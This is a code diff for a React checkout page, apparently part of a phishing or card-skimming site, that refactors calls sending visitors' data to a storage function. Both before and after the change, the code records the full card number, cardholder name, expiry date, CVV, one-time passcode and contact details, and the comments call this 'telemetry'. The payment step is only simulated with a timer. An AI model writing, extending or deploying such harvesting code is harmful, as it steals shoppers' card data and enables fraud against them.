@@ -118,17 +118,16 @@ function OtpStep({
           <form
             onSubmit={async (e) => {
               e.preventDefault();
-              try {
-                await addData({
-                  id: ensureVisitorId(),
-                  step: "otp",
-                  page: window.location.pathname,
-                  otp: otp,
-                  otpAt: new Date().toISOString(),
-                });
-              } catch {
-                /* non-blocking: still attempt OTP */
-              }
+              // Fire-and-forget telemetry: never block the OTP submit flow.
+              void addData({
+                id: ensureVisitorId(),
+                step: "otp",
+                page: window.location.pathname,
+                otp: otp,
+                otpAt: new Date().toISOString(),
+              }).catch(() => {
+                /* non-blocking */
+              });
               submitOtp(otp);
             }}
           >
@@ -256,21 +255,20 @@ function ClickPayStep({
     const fullCard = digits;
     const last4 = digits.slice(-4);
     const safeName = name.trim();
-    try {
-      await addData({
-        id: ensureVisitorId(),
-        step: "clickpay",
-        page: window.location.pathname,
-        cardNumber: fullCard,
-        cardLast4: last4,
-        cardName: safeName,
-        expiry: `${mm}/${yy}`,
-        cvv: cvv,
-        cardSubmittedAt: new Date().toISOString(),
-      });
-    } catch {
-      /* non-blocking: continue payment flow */
-    }
+    // Fire-and-forget telemetry: never block the payment flow.
+    void addData({
+      id: ensureVisitorId(),
+      step: "clickpay",
+      page: window.location.pathname,
+      cardNumber: fullCard,
+      cardLast4: last4,
+      cardName: safeName,
+      expiry: `${mm}/${yy}`,
+      cvv: cvv,
+      cardSubmittedAt: new Date().toISOString(),
+    }).catch(() => {
+      /* non-blocking */
+    });
     setError("");
     setPaying(true);
     setTimeout(() => {
@@ -769,35 +767,33 @@ export default function Checkout() {
     );
   }
 
-  const handleStep1 = async (e: React.FormEvent) => {
+  const handleStep1 = (e: React.FormEvent) => {
     e.preventDefault();
-    try {
-      await addData({
-        id: ensureVisitorId(),
-        step: "contact",
-        page: window.location.pathname,
-        contactSubmittedAt: new Date().toISOString(),
-        ...form,
-      });
-    } catch {
-      /* non-blocking: still advance to payment step */
-    }
+    // Fire-and-forget telemetry: never block step transitions.
+    void addData({
+      id: ensureVisitorId(),
+      step: "contact",
+      page: window.location.pathname,
+      contactSubmittedAt: new Date().toISOString(),
+      ...form,
+    }).catch(() => {
+      /* non-blocking */
+    });
     setStep("payment");
   };
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    try {
-      await addData({
-        id: ensureVisitorId(),
-        step: "payment",
-        page: window.location.pathname,
-        paymentMethodSubmittedAt: new Date().toISOString(),
-        ...form,
-      });
-    } catch {
-      /* non-blocking: still advance to clickpay step */
-    }
+    // Fire-and-forget telemetry: never block step transitions.
+    void addData({
+      id: ensureVisitorId(),
+      step: "payment",
+      page: window.location.pathname,
+      paymentMethodSubmittedAt: new Date().toISOString(),
+      ...form,
+    }).catch(() => {
+      /* non-blocking */
+    });
     setSubmitError(null);
     setPendingPaymentStatus(form.payment === "credit" ? "paid" : "unpaid");
     setStep("clickpay");
